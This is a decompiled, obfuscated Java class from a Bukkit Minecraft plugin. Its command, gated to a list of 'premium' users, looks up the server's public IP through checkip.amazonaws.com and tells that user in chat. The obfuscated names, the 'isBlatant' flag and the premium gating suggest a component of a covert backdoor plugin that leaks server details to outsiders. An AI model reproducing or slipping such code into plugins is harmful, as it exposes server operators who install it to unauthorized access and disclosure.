/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class GetipCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lllllllllllllIlIlIIIlIIlIIIllllI, String lllllllllllllIlIlIIIlIIlIIlIIIIl, String[] lllllllllllllIlIlIIIlIIlIIlIIIII, Player lllllllllllllIlIlIIIlIIlIIIlllll) {
        if (lllllllllllllIlIlIIIlIIlIIIllllI.premium.contains(lllllllllllllIlIlIIIlIIlIIIlllll.getName())) {
            try {
                URL lllllllllllllIlIlIIIlIIlIIlIIllI = new URL("http://checkip.amazonaws.com");
                BufferedReader lllllllllllllIlIlIIIlIIlIIlIIlIl = new BufferedReader(new InputStreamReader(lllllllllllllIlIlIIIlIIlIIlIIllI.openStream()));
                String lllllllllllllIlIlIIIlIIlIIlIIlII = lllllllllllllIlIlIIIlIIlIIlIIlIl.readLine();
                lllllllllllllIlIlIIIlIIlIIIlllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The server's numeric IP is: ").append(lllllllllllllIlIlIIIlIIlIIlIIlII))));
            }
            catch (IOException iOException) {}
        } else {
            lllllllllllllIlIlIIIlIIlIIIlllll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    public GetipCommand() {
        GetipCommand lllllllllllllIlIlIIIlIIlIIlIllII;
    }
}

